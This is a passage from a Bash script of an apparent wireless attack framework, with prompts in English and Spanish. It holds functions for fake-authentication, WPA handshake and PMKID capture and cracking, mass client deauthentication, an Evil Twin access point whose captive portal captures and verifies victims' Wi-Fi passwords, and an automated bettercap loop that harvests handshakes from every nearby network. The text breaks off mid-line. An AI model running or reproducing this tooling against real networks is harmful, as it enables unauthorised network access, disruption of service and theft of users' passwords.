ap_dir=\"${essid}-${ap_bssid}\"\n  elif [ \"${ap_bssid}\" ] && [ ! \"${essid}\" ]; then\n    ap_dir=\"${ap_bssid}\"\n  fi\n\n  check_and_create \"/usr/share/wef/main/captures/${ap_dir}\"\n  ask_to_capture_ivs\n\n  default=\"5m\"\n  ask_time\n  if [ \"$attack_time\" == \"back\" ]; then\n    return\n  fi\n\n  clear\n  log_attack_info\n  press_enter_attack\n  echo\n  if [ \"$lang\" == \"en\" ]; then\n    progress_bar 2 0.2 \"*\" \"Starting Fake Authentication attack, press Ctrl+C to stop it\"\n  else\n    progress_bar 2 0.2 \"*\" \"Comenzando ataque de autenticación falsa, presiona Ctrl+C para pararlo\"\n  fi\n\n  echo\n  if [ \"$verbose\" == \"false\" ]; then\n    aireplay-ng -1 3 -o 1 -q 10 -a \"${ap_bssid}\" -h \"${current_mac}\" ${netCard} &>/dev/null &\n  elif [ \"$verbose\" == \"true\" ]; then\n    aireplay-ng -1 3 -o 1 -q 10 -a \"${ap_bssid}\" -h \"${current_mac}\" ${netCard} &\n  fi\n\n  aireplay_PID=$!\n  sleep \"${attack_time}\"\n  kill -9 ${aireplay_PID} 2>/dev/null; wait ${aireplay_PID} 2>/dev/null\n\n  echo\n  if [ \"${c_i}\" == \"true\" ]; then # Enter here is user wants to capture IVs\n    sleep 0.5\n    kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null\n\n    echo\n    move_capture_files\n    log_capture_files\n  fi\n\n  write_informative_log\n  log_completed\n  create_graph \"/usr/share/wef/cache/airodump-01.csv\" \"/usr/share/wef/main/graphs/${cap_name}.png\"\n  reset_info\n  keep_exit\n}\n\n\n#\n# Handshake attacks\n#\n\n# Passive WPA Capture attack (airodump-ng)\nfunction passive_capture_attack(){\n  clear\n  color_output_ln \"*\" \"This attack tries to capture network packets constantly in order to catch a handshake of a device connecting to the access point\"\n  scan_aps # Scan nearby APs\n  log_back_to_menu\n\n  ask_target\n  if [ \"$number\" == \"back\" ]; then\n    return\n  fi\n  parse_info\n\n  default=\"5m\"\n  ask_time\n  if [ \"$attack_time\" == \"back\" ]; then\n    return\n  fi\n\n  clear\n  log_attack_info\n  press_enter_attack\n  echo\n  if [ \"$lang\" == \"en\" ]; then\n    progress_bar 2 0.2 \"*\" \"Starting passive WPA handshake capture attack, press Ctrl+C to stop it\"\n  else\n    progress_bar 2 0.2 \"*\" \"Comenzando ataque pasivo de captura de handshake WPA, presiona Ctrl+C para pararlo\"\n  fi\n\n  if [ \"${ap_bssid}\" ] && [ \"${essid}\" ]; then\n    ap_dir=\"${essid}-${ap_bssid}\"\n  elif [ \"${ap_bssid}\" ] && [ ! \"${essid}\" ]; then\n    ap_dir=\"${ap_bssid}\"\n  fi\n\n  check_and_create \"/usr/share/wef/main/captures/${ap_dir}\"\n  cap_name=$(date +\"%Y-%m-%d-%H-%M-%S\")\n\n  if [ \"${airmon_check_kill}\" == \"true\" ]; then\n    xterm -hold -bg \"#000000\" -fg \"#FFFFFF\" -geometry -10+10 -T \"Airodump-ng\" -xrm 'XTerm*selectToClipboard: true' -e \"airodump-ng -c ${channel} -w \\\"/usr/share/wef/main/captures/${ap_dir}/${cap_name}\\\" --bssid \\\"${ap_bssid}\\\" ${netCard}\" 2>/dev/null & # Escape double quotes to avoid errors\n  else\n    airodump-ng -c ${channel} -w \"/usr/share/wef/main/captures/${ap_dir}/${cap_name}\" --bssid \"${ap_bssid}\" ${netCard} &\n  fi\n  passive_PID=$!\n\n  sleep \"${attack_time}\" # Sleep for the asked time\n  kill -9 ${passive_PID} 2>/dev/null; wait ${passive_PID} 2>/dev/null # Kill background process\n\n  echo\n  move_capture_files\n  check_captured_handshakes\n  write_informative_log\n\n  log_completed\n  log_capture_files\n  create_graph \"/usr/share/wef/cache/airodump-01.csv\" \"/usr/share/wef/main/graphs/${cap_name}.png\"\n\n  c_h=\"true\"\n  ask_to_crack_handshakes\n\n  if [ \"$crack_option\" == \"y\" ] || [ \"$crack_option\" == \"yes\" ] || [ \"$crack_option\" == \"s\" ] || [ \"$crack_option\" == \"si\" ]; then\n    crack_handshake\n  elif [ \"$crack_option\" == \"exit\" ] || [ \"$crack_option\" == \"quit\" ]; then\n    ctrl_c\n  else\n    reset_info\n    keep_exit\n  fi\n}\n\n# PMKID attack (hcxtools)\nfunction pmkid_attack(){\n  clear\n  color_output_ln \"*\" \"This attack attempts to catch the PMKID handshake of an access point. This is a clientless attack\"\n  scan_aps # Scan nearby APs\n  log_back_to_menu\n\n  # Disable monitor mode as hcxtools may break if interface is in monitor mode\n  airmon-ng stop ${netCard} &>/dev/null\n\n  ask_target\n  if [ \"$number\" == \"back\" ]; then\n    return\n  fi\n  parse_info\n\n  default=\"180s\"\n  ask_time\n  if [ \"$attack_time\" == \"back\" ]; then\n    return\n  fi\n\n  # Parse wifi info\n  if [[ $channel -le 14 ]]; then\n    pmkid_channel=\"${channel}a\"\n  elif [[ $channel -gt 14 ]]; then\n    pmkid_channel=\"${channel}b\"\n  fi\n\n  clear\n  log_attack_info\n  press_enter_attack\n  echo\n  if [ \"$lang\" == \"en\" ]; then\n    progress_bar 2 0.2 \"*\" \"Starting PMKID attack, press Ctrl+C to stop it\"\n  else\n    progress_bar 2 0.2 \"*\" \"Comenzando ataque PMKID, presiona Ctrl+C para pararlo\"\n  fi\n\n  if [ \"${ap_bssid}\" ] && [ \"${essid}\" ]; then\n    ap_dir=\"${essid}-${ap_bssid}\"\n  elif [ \"${ap_bssid}\" ] && [ ! \"${essid}\" ]; then\n    ap_dir=\"${ap_bssid}\"\n  fi\n\n  check_and_create \"/usr/share/wef/main/captures/${ap_dir}\"\n\n  file_date=\"$(date +\"%Y-%m-%d-%H-%M-%S\")\"\n  hcxdumptool -i ${oldCard} -c ${pmkid_channel} -w \"/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid.pcapng\" | grep -v \"bye-bye\" &\n  hcx_PID=$!\n  sleep \"${attack_time}\"\n  kill -9 ${hcx_PID} 2>/dev/null; wait ${hcx_PID} 2>/dev/null\n  sleep 0.5\n\n  if [ ! \"${ctrl_c_pressed}\" ]; then\n    echo\n    if [ \"$lang\" == \"en\" ]; then\n      color_output \"*\" \"Extracting hashes from /usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid.pcapng\"\n    else\n      color_output \"*\" \"Extrayendo hashes de /usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid.pcapng\"\n    fi\n    sleep 1.2 # Let the user read\n\n    if [ \"$verbose\" == \"false\" ]; then\n      hcxpcapngtool -o \"/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_mixed_handshakes.txt\" \"/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid.pcapng\" &>/dev/null\n    elif [ \"$verbose\" == \"true\" ]; then\n      echo\n      hcxpcapngtool -o \"/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_mixed_handshakes.txt\" \"/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid.pcapng\"\n    fi; sleep 1\n  fi\n\n  if [ ! \"${ctrl_c_pressed}\" ]; then\n    if [ -f \"/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_mixed_handshakes.txt\" ]; then\n      if [ \"$lang\" == \"en\" ]; then\n        progress_bar 2 0.2 \"*\" \"Filtering target AP hashes\"\n      else\n        progress_bar 2 0.2 \"*\" \"Filtrando hashes del AP objetivo\"\n      fi\n\n      if [ \"$verbose\" == \"false\" ]; then\n        hcxhashtool -o \"/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_filtered_handshakes.txt\" --type=1 --mac-ap=${ap_bssid} -i \"/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_mixed_handshakes.txt\" &>/dev/null\n      elif [ \"$verbose\" == \"true\" ]; then\n        hcxhashtool -o \"/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_filtered_handshakes.txt\" --type=1 --mac-ap=${ap_bssid} -i \"/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_mixed_handshakes.txt\"\n      fi; sleep 0.2\n    fi\n  fi\n\n  # Re-enable monitor mode (with airmon-ng)\n  ip link set ${oldCard} down 2>/dev/null\n  iw ${oldCard} set type managed 2>/dev/null\n  ip link set ${oldCard} up 2>/dev/null\n  airmon-ng start ${oldCard} &>/dev/null\n\n  write_informative_log\n  log_completed\n  create_graph \"/usr/share/wef/cache/airodump-01.csv\" \"/usr/share/wef/main/graphs/${cap_name}.png\"\n\n  if [ -f \"/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_filtered_handshakes.txt\" ]; then\n    if [ \"$lang\" == \"en\" ]; then\n      handshake_total=$(wc -l \"/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_filtered_handshakes.txt\" | awk '{print $1}')\n      color_output \"*\" \"${handshake_total} handshakes written to /usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_filtered_handshakes.txt\"\n      color_output_no_line \"*\" \"Do you want to crack the PMKID handshakes? (${yC}yes${blueC}/${yC}no${blueC}): ${endC}\" && read crack_option\n    else\n      handshake_total=$(wc -l \"/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_filtered_handshakes.txt\" | awk '{print $1}')\n      color_output \"*\" \"${handshake_total} handshakes almacenados en /usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_filtered_handshakes.txt\"\n      color_output_no_line \"*\" \"¿Quieres crackear los handshakes PMKID? (${yC}si${blueC}/${yC}no${blueC}): ${endC}\" && read crack_option\n    fi\n\n  else\n    if [ \"$lang\" == \"en\" ]; then\n      color_output \"*\" \"No PMKID handshakes captured\"\n    else\n      color_output \"*\" \"No se han capturado handshakes PMKID\"\n    fi\n  fi\n  \n  if [ \"$crack_option\" == \"y\" ] || [ \"$crack_option\" == \"yes\" ] || [ \"$crack_option\" == \"s\" ] || [ \"$crack_option\" == \"si\" ]; then\n    crack_pmkid_handshakes \"/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_filtered_handshakes.txt\"\n  elif [ \"$crack_option\" == \"exit\" ] || [ \"$crack_option\" == \"quit\" ]; then\n    ctrl_c\n  else\n    reset_info\n    keep_exit\n  fi\n}\n\n\n# Inhibitor Function\nfunction inhibitor(){\n  trap inhibition_c INT # Change Ctrl+C keyboard interrupt function\n\n  iw dev ${netCard} set channel ${channel} 2>/dev/null # Configure the interface on the same channel\n\n  if [ \"$lang\" == \"en\" ]; then\n    progress_bar 2 0.2 \"*\" \"Starting inhibition process\"\n    color_output_ln \"*\" \"Press Ctrl+C to stop the attack\"\n  else\n    progress_bar 2 0.2 \"*\" \"Comenzando proceso de inhibición\" \n    color_output_ln \"*\" \"Presiona Ctrl+C para parar el ataque\"\n  fi\n\n  if [ \"$verbose\" == \"false\" ]; then\n    aireplay-ng -0 0 -a \"${ap_bssid}\" -c FF:FF:FF:FF:FF:FF ${netCard} &>/dev/null\n  elif [ \"$verbose\" == \"true\" ]; then\n    echo\n    aireplay-ng -0 0 -a \"${ap_bssid}\" -c FF:FF:FF:FF:FF:FF ${netCard}\n    echo\n  fi\n\n  if [ \"$lang\" == \"en\" ]; then\n    good_output_ln \"+\" \"Inhibition process completed\"\n  else\n    good_output_ln \"+\" \"Proceso de inhibición completada\"\n  fi\n\n  reset_info\n}\n\n\n\n\n#\n# Evil Twin attack functions\n#\n\nfunction setup_interface_eviltwin(){\n  if [ \"$evil_option\" == \"2\" ] || [ \"$evil_option\" == \"4\" ]; then\n    if hash rfkill 2> /dev/null; then\n      rfkill unblock all > /dev/null 2>&1\n    fi\n\n    ip link set \"${evilCard}\" down 2>/dev/null\n    iw \"${evilCard}\" set monitor control 2>/dev/null\n    # Check MAC spoofing\n    if [ \"$mac_spoof\" == \"y\" ] || [ \"$mac_spoof\" == \"yes\" ] || [ \"$mac_spoof\" == \"s\" ] || [ \"$mac_spoof\" == \"si\" ]; then\n      macchanger -m \"${ap_bssid}\" ${evilCard} &>/dev/null\n    fi\n    ip link set \"${evilCard}\" up 2>/dev/null\n\n    rand_mac=\"$(hexdump -n 6 -ve '1/1 \"%.2x \"' /dev/random | awk -v a=\"2,6,a,e\" -v r=\"$RANDOM\" 'BEGIN{srand(r);}NR==1{split(a,b,\",\");r=int(rand()*4+1);printf \"%s%s:%s:%s:%s:%s:%s\\n\",substr($1,0,1),b[r],$2,$3,$4,$5,$6}')\"\n    iw \"${evilCard}\" interface add \"mon${evilCard}\" type monitor addr ${rand_mac}; sleep 0.3\n\n  else\n    ip link set \"${evilCard}\" down 2>/dev/null\n    #iwconfig \"${evilCard}\" mode monitor 2>/dev/null\n    iw \"${evilCard}\" set type monitor 2>/dev/null\n    # Check MAC spoofing\n    if [ \"$mac_spoof\" == \"y\" ] || [ \"$mac_spoof\" == \"yes\" ] || [ \"$mac_spoof\" == \"s\" ] || [ \"$mac_spoof\" == \"si\" ]; then\n      macchanger -m \"${ap_bssid}\" ${evilCard} &>/dev/null\n    fi\n    ip link set \"${evilCard}\" up 2>/dev/null\n  fi\n}\n\nfunction restore_interface_eviltwin(){\n  if [ \"$evil_option\" == \"2\" ] || [ \"$evil_option\" == \"4\" ]; then\n    iw \"mon${evilCard}\" del 2>/dev/null; sleep 0.2\n  fi\n\n  ip link set \"${evilCard}\" down 2>/dev/null; sleep 0.1\n  #iwconfig \"${evilCard}\" mode managed 2>/dev/null; sleep 0.1\n  iw \"${evilCard}\" set type managed 2>/dev/null; sleep 0.1\n  ip link set \"${evilCard}\" up 2>/dev/null; sleep 0.2\n}\n\nfunction create_lighttpd_conf(){\n  { \n  echo -e \"server.document-root = \\\"${portal_path}\\\"\\n\"\n\techo -e \"server.modules = (\"\n\techo -e \"  \\\"mod_auth\\\",\"\n\techo -e \"  \\\"mod_cgi\\\",\"\n\techo -e \"  \\\"mod_redirect\\\"\"\n\techo -e \")\\n\"\n\techo -e \"\\$HTTP[\\\"host\\\"] =~ \\\"(.*)\\\" {\"\n\techo -e \"  url.redirect = ( \\\"^/index.htm$\\\" => \\\"/\\\")\"\n\techo -e \"  url.redirect-code = 302\"\n\techo -e \"}\\n\"\n\techo -e \"\\$HTTP[\\\"host\\\"] =~ \\\"gstatic.com\\\" {\"\n\techo -e \"  url.redirect = ( \\\"^/(.*)$\\\" => \\\"http://connectivitycheck.google.com/\\\")\"\n\techo -e \"  url.redirect-code = 302\"\n\techo -e \"}\\n\"\n\techo -e \"\\$HTTP[\\\"host\\\"] =~ \\\"captive.apple.com\\\" {\"\n\techo -e \"  url.redirect = ( \\\"^/(.*)$\\\" => \\\"http://connectivitycheck.apple.com/\\\")\"\n\techo -e \"  url.redirect-code = 302\"\n\techo -e \"}\\n\"\n\techo -e \"\\$HTTP[\\\"host\\\"] =~ \\\"msftconnecttest.com\\\" {\"\n\techo -e \"  url.redirect = ( \\\"^/(.*)$\\\" => \\\"http://connectivitycheck.microsoft.com/\\\")\"\n\techo -e \"  url.redirect-code = 302\"\n\techo -e \"}\\n\"\n\techo -e \"\\$HTTP[\\\"host\\\"] =~ \\\"msftncsi.com\\\" {\"\n\techo -e \"  url.redirect = ( \\\"^/(.*)$\\\" => \\\"http://connectivitycheck.microsoft.com/\\\")\"\n\techo -e \"  url.redirect-code = 302\"\n\techo -e \"}\\n\"\n\techo -e \"server.port = 80\\n\"\n\techo -e \"index-file.names = ( \\\"index.htm\\\", \\\"index.html\\\", \\\"index.php\\\" )\\n\"\n\techo -e \"server.error-handler-404 = \\\"/\\\"\\n\"\n\techo -e \"mimetype.assign = (\"\n\techo -e \"  \\\".css\\\" => \\\"text/css\\\",\"\n\techo -e \"  \\\".js\\\" => \\\"text/javascript\\\",\"\n  echo -e \"  \\\".html\\\" => \\\"text/html\\\"\"\n\techo -e \")\\n\"\n\techo -e \"cgi.assign = ( \\\".htm\\\" => \\\"/bin/bash\\\" )\"\n\t} >> \"/usr/share/wef/cache/lighttpd.conf\"\n}\n\n# Use 'sed' with regex to edit template\nfunction create_template(){\n  sed -i \"s/<span class=\\\"bold\\\">.*<\\/span>/<span class=\\\"bold\\\">${essid}<\\/span>/\" /usr/share/wef/main/captive-portals/${country_code}-portal/index.htm\n  handshake_path=$(echo \"${handshake_cap}\" | sed 's/\\//\\\\\\//g')\n\n  sed -i \"26s/.*/if [ \\\"\\$(timeout 1.5 bash -c \\\"aircrack-ng -a 2 -b ${ap_bssid} -w \\'\\/tmp\\/www\\/currentpass.txt\\' \\'${handshake_path}\\' 2>\\/dev\\/null | grep \\'KEY FOUND\\'\\\")\\\" ]; then/\" /usr/share/wef/main/captive-portals/${country_code}-portal/check.htm\n}\n\nfunction check_eviltwin_password(){\n  while true; do\n    sleep 0.1\n    if [ -f \"/tmp/www/success.txt\" ] && [ \"$(cat /tmp/www/currentpass.txt)\" ]; then\n      if [ \"$lang\" == \"en\" ]; then\n        echo -e \"\\n\\n${blueC}[${greenC}+${blueC}] Correct password obtained: ${yC}$(cat /tmp/www/currentpass.txt)${endC}\"\n        good_output \"+\" \"Password stored in /usr/share/wef/main/captures/${ap_dir}/eviltwin_password.txt\"\n      else\n        echo -e \"\\n\\n${blueC}[${greenC}+${blueC}] Contraseña correcta obtenida: ${yC}$(cat /tmp/www/currentpass.txt)${endC}\"\n        good_output \"+\" \"Contraseña almacenada en /usr/share/wef/main/captures/${ap_dir}/eviltwin_password.txt\"\n      fi\n      \n      cp \"/tmp/www/currentpass.txt\" \"/usr/share/wef/main/captures/${ap_dir}/eviltwin_password.txt\" 2>/dev/null\n      rm -rf \"/tmp/www\" 2>/dev/null\n\n      sleep 4\n      killall xterm hostapd dnsmasq lighttpd 2>/dev/null\n      break\n    fi\n  done\n  \n  if [ \"$lang\" == \"en\" ]; then\n    press_enter \"Attack finished, press [Enter] to return to menu \"\n  else\n    press_enter \"El ataque ha terminado, presiona [Enter] para volver al menu \"\n  fi\n}\n\nfunction check_eviltwin_success(){\n  while true; do\n    arp_out=$(arp -i ${evilCard} | grep \"${evilCard}\" | awk '{print $1}')\n    arp_len=$(echo ${arp_out} | wc -l)\n    echo -e \"${blueC}[${yC}*${blueC}] EvilTwin${2}${endC}\"\n    echo -e \"${blueC}------------${endC}\"\n\n    if [ \"$lang\" == \"en\" ]; then\n      if [[ $arp_len == 1 ]] && [ ! \"$arp_out\" ]; then\n        echo -e \"${blueC}Total devices: ${yC}0${endC}\"\n      else\n        echo -e \"${blueC}Total devices: ${yC}${arp_len}${endC}\"\n      fi\n    else\n      if [[ $arp_len == 1 ]] && [ ! \"$arp_out\" ]; then\n        echo -e \"${blueC}Dispositivos totales: ${yC}0${endC}\"\n      else\n        echo -e \"${blueC}Dispositivos totales: ${yC}${arp_len}${endC}\"\n      fi\n    fi\n\n    if [[ $arp_len != 0 ]] && [ \"${arp_out}\" ]; then\n\n      if [ \"$lang\" == \"en\" ]; then\n        echo -e \"${blueC}Devices info:${endC}\"\n      else\n        echo -e \"${blueC}Información sobre los dispositivos:${endC}\"\n      fi\n\n      echo -e \"${arp_out}\"\n    fi\n\n    if [ -f \"/tmp/www/currentpass.txt\" ]; then\n      if [ \"$lang\" == \"en\" ]; then\n        echo -e \"\\n${blueC}Last passwords tried:\\n${grayC}$(cat /tmp/www/attempts.txt 2>/dev/null)${endC}\"\n      else\n        echo -e \"\\n${blueC}Últimas contraseñas probadas:\\n${grayC}$(cat /tmp/www/attempts.txt 2>/dev/null)${endC}\"\n      fi\n    fi\n\n    if [ -f \"/tmp/www/success.txt\" ]; then\n      if [ \"$lang\" == \"en\" ]; then\n        echo -e \"\\n${blueC}[${greenC}+${blueC}] Correct password: ${grayC}$(cat /tmp/www/currentpass.txt 2>/dev/null)${endC}${endC}\"\n      else\n        echo -e \"\\n${blueC}[${greenC}+${blueC}] Contraseña correcta: ${grayC}$(cat /tmp/www/currentpass.txt 2>/dev/null)${endC}${endC}\"\n      fi\n      sleep 5\n      break\n    fi\n\n    sleep 1; clear\n  done\n}\n\nfunction execute_bettercap_command(){\n  curl -s -X POST \"http://user:pass@127.0.0.1:8081/api/session\" -H \"Content-Type: application/json\" -d '{\"cmd\": \"'\"${1}\"'\"}' &>/dev/null\n}\n\nfunction pwnagotchi_check_handshake(){\n  sleep 6\n\n  #cch=\"$(curl -s http://user:pass@127.0.0.1:8081/api/session | jq -r '.wifi.aps' | jq -r --arg mac \"${1}\" 'map(select(.mac == $mac)) | .[] | if .handshake == true then \"true\" else \"false\" end')\"\n\n  wpa_check=\"$(echo \"1\" | aircrack-ng /root/bettercap-wifi-handshakes.pcap 2>/dev/null | grep \"WPA\" | grep -i \"${1}\" | grep -oP '(?<=WPA \\().*(?=handshake)' | tr -d \" \")\"\n  pmkid_check=\"$(echo \"1\" | aircrack-ng /root/bettercap-wifi-handshakes.pcap 2>/dev/null | grep \"WPA\" | grep -i \"${1}\" | grep \"PMKID\")\"\n\n  if [ ! \"$wpa_check\" ]; then\n    wpa_check=0\n  fi\n\n  # Debug\n  #echo -e \"ESSID: ${2}; BSSID: ${1}; wpa_check: ${wpa_check}; pmkid_check: ${pmkid_check}\"\n\n  # Check if at least one WPA or PMKID handshake was captured\n  if [[ \"${wpa_check}\" -gt 0 ]] || [ \"${pmkid_check}\" ]; then\n    # Extract handshake from .pcap file\n    hcxpcapngtool /root/bettercap-wifi-handshakes.pcap -o /usr/share/wef/cache/bettercap_handshakes.txt &>/dev/null\n    sleep 0.1\n\n    if [ \"$(cat /usr/share/wef/cache/bettercap_handshakes.txt | grep -i \"$(echo \"${1}\" | tr -d \":\")\")\" ]; then\n      if [ \"${2}\" ]; then\n        if [ \"$lang\" == \"en\" ]; then\n          echo -e \"${blueC}[${grayC}$(date +\"%H:%M:%S\")${blueC}] ${grayC}${2} ${blueC}(${grayC}${1}${blueC}) handshake has been captured and written to /usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/${2}-${1}/handshake.txt${endC}\"\n        else\n          echo -e \"${blueC}[${grayC}$(date +\"%H:%M:%S\")${blueC}] El handshake de ${grayC}${2} ${blueC}(${grayC}${1}${blueC}) ha sido capturado y guardado como /usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/${2}-${1}/handshake.txt${endC}\"\n        fi\n      else\n        if [ \"$lang\" == \"en\" ]; then\n          echo -e \"${blueC}[${grayC}$(date +\"%H:%M:%S\")${blueC}] ${grayC}${1} ${blueC} handshake has been captured and written to /usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/${1}/handshake.txt${endC}\"\n        else\n          echo -e \"${blueC}[${grayC}$(date +\"%H:%M:%S\")${blueC}] El handshake de ${grayC}${1} ${blueC} ha sido capturado y guardado como /usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/${1}/handshake.txt${endC}\"\n        fi\n      fi\n\n      # Create a folder to save captured handshakes based on each AP essid and bssid\n      if [ ! -d \"/usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/${2}-${1}/\" ] && [ \"${2}\" ]; then\n        mkdir \"/usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/${2}-${1}/\" 2>/dev/null\n      elif [ ! \"${2}\" ]; then\n        mkdir \"/usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/${1}/\" 2>/dev/null\n      fi\n\n      sleep 0.1\n\n      if [ \"${2}\" ]; then\n        hcxhashtool -i /usr/share/wef/cache/bettercap_handshakes.txt -o /usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/${2}-${1}/handshake.txt --mac-ap=$(echo \"${1}\" | tr -d \":\") &>/dev/null\n      else\n        hcxhashtool -i /usr/share/wef/cache/bettercap_handshakes.txt -o /usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/${1}/handshake.txt --mac-ap=$(echo \"${1}\" | tr -d \":\") &>/dev/null\n      fi\n    fi\n\n    rm /usr/share/wef/cache/bettercap_handshakes.txt 2>/dev/null\n  fi\n}\n\n# Declare array which will contain the discovered APs\nexport seen_aps=()\n# Declare array which will contain the APs that have been already pwned to skip them during loop\nexport pwned_aps_list=()\n# Declare array which will contain APs that have not been pwned on the first attempt\nexport not_pwned_aps_list=()\n# Declare array which will contain the APs that their handshake have not been captured even after multiple attempts to skip them\nexport not_pwneable_aps_list=()\n\nfunction pwnagotchi(){\n  clear\n\n  if [ \"$lang\" == \"en\" ]; then\n    # Display info about current status\n    echo -e \"${yC}PWNAGOTCHI MODE${endC}\"\n    echo -e \"${yC}---------------${endC}\"\n\n    color_output \"*\" \"The Pwnagotchi mode runs indefinitely until you press Ctrl+C\"\n    color_output \"*\" \"If you want to add an AP to the whitelist, edit the config file and add \\\"whitelist=<your bssid goes here>\\\" without the double quotes\"\n    color_output \"*\" \"Obtained handshakes will be stored in /usr/share/wef/main/pwnagotchi/\"\n    color_output \"*\" \"A new folder will be created for every targeted AP to store the obtained info\"\n  else\n    # Display info about current status\n    echo -e \"${yC}MODO PWNAGOTCHI${endC}\"\n    echo -e \"${yC}---------------${endC}\"\n\n    color_output \"*\" \"El modo Pwnagotchi correrá de forma infinita hasta que presiones Ctrl+C\"\n    color_output \"*\" \"Si quieres añadir un AP a la whitelist, edita el archivo de configuración y añade \\\"whitelist=<tu bssid va aquí>\\\" sin las comillas\"\n    color_output \"*\" \"Los handshakes obtenidos se almacenarán en /usr/share/wef/main/pwnagotchi/\"\n    color_output \"*\" \"Se creará una carpeta por cada AP que sea atacado para almacenar la información obtenida\"\n  fi\n\n  press_enter_attack\n\n  trap keep_exit_pwnagotchi INT\n  \n  # Create directory for current pwnagotchi session\n  pwnagotchi_dir=\"$(date +\"%Y-%m-%d-%H-%M-%S\")\"\n  mkdir \"/usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/\" 2>/dev/null\n\n  if [ \"\" == \"en\" ]; then\n    color_output_ln \"*\" \"Starting bettercap service...\"\n    color_output \"*\" \"Gathered information will be saved under /usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/\"\n  else\n    color_output_ln \"*\" \"Iniciando servicio de bettercap...\"\n    color_output \"*\" \"La información obtenida se almacenará bajo la ruta /usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/\"\n  fi\n  bettercap -caplet http-ui -iface \"${netCard}\" &>/dev/null &\n  sleep 2\n  echo\n\n  # Declare variable just to check on first loop\n  first_loop=\"true\"\n\n  # Declare time to reset detected APs\n  reset_time=\"60s\"\n\n  # Declare debug variable (just for development purposes)\n  debug=\"false\"\n\n  whitelist_bssid=\"$(awk -F '=' '/whitelist/ {print $2}' /usr/share/wef/wef.cnf | sed 's/#.*//' | tr -d \" \" | tr '[:upper:]' '[:lower:]' )\"\n\n  # Display info about current status\n  if [ \"$lang\" == \"en\" ]; then\n    echo -e \"${yC}ACTIVITY LOG${endC}\"\n    echo -e \"${yC}------------${endC}\"\n  else\n    echo -e \"${yC}REGISTRO DE ACTIVIDAD${endC}\"\n    echo -e \"${yC}---------------------${endC}\"\n  fi\n\n  # Scan nearby APs\n  execute_bettercap_command \"wifi.recon on\"\n  sleep 0.5\n\n  #(\n    #while true; do\n      # Wait for N time to reset available information about current nearby APs that have not been pwned yet \n      #sleep \"${reset_time}\"\n\n      #echo -e \"RESETTING ARRAYS\"\n\n      # Empty arrays\n      #seen_aps=()\n      #not_pwned_aps=()\n      #not_pwneable_aps=()\n    #done\n  #) &\n\n  # Start infinite loop\n  while true; do\n    # Scan nearby APs (wifi.recon on)\n    # Sleep for 6 seconds\n    # Iterate over all APs\n    # Change current channel (wifi.recon.channel x) in case it is different\n    # Send association to get PMKID (wifi.assoc <bssid>)\n    # Deauth all clients (one by one) (wifi.deauth <station>)\n\n    # Set channels on which to scan nearby APs\n    execute_bettercap_command \"wifi.recon.channel 1,2,3,4,5,6,7,8,9,10,11,12,13\"\n\n    if [ \"$lang\" == \"en\" ]; then\n      if [ \"${first_loop}\" == \"true\" ]; then\n        echo -e \"${blueC}[${grayC}$(date +\"%H:%M:%S\")${blueC}] Scanning nearby access points${endC}\"\n      else\n        echo -e \"${blueC}[${grayC}$(date +\"%H:%M:%S\")${blueC}] Scanning new nearby access points${endC}\"\n      fi\n    else\n      if [ \"${first_loop}\" == \"true\" ]; then\n        echo -e \"${blueC}[${grayC}$(date +\"%H:%M:%S\")${blueC}] Escaneando puntos de acceso cercanos${endC}\"\n      else\n        echo -e \"${blueC}[${grayC}$(date +\"%H:%M:%S\")${blueC}] Escaneando nuevos puntos de acceso cercanos${endC}\"\n      fi\n    fi\n\n    # Wait some seconds to discover nearby APs and their stations\n    sleep 6.75\n\n    # Extract and parse JSON info using jq\n    aps=\"$(curl -s \"http://user:pass@127.0.0.1:8081/api/session\" | jq -r '.wifi.aps' | jq -r 'map(select((.channel < 36 or .channel > 165) and .encryption != \"OPEN\")) | sort_by(.channel) | .[] | \"\\(.mac),\\(.hostname),\\(.channel),\" + (if .clients | length > 0 then \"\" + (.clients[] | \"\\(.mac),\") else \"\" end)' | sort -u)\"\n\n    if [ \"$debug\" == \"true\" ]; then\n      echo -e \"$aps\\n\"\n    fi\n\n    #echo -e \"aps: $aps\"\n    #echo -e \"old_aps: $old_aps\"\n\n    # Parse pwned APs\n    for d in /usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/*; do\n      pwned_bssid=\"$(echo \"${d}\" | awk '{print $NF}' FS=\"/\" | awk '{print $NF}' FS=\"-\")\"\n\n      if [ \"${pwned_bssid}\" != \"*\" ]; then\n        pwned_aps_list+=(\"${pwned_bssid}\")\n      fi\n\n      # Remove AP from other arrays because it has been pwned\n      if [ \"${pwned_bssid}\" ] && [ \"${pwned_bssid}\" != \"*\" ]; then\n        seen_aps=($(echo \"${seen_aps[@]}\" | tr ' ' '\\n' | sort -u | grep -v \"${pwned_bssid}\" | tr '\\n' ' '))\n        not_pwned_aps_list=($(echo 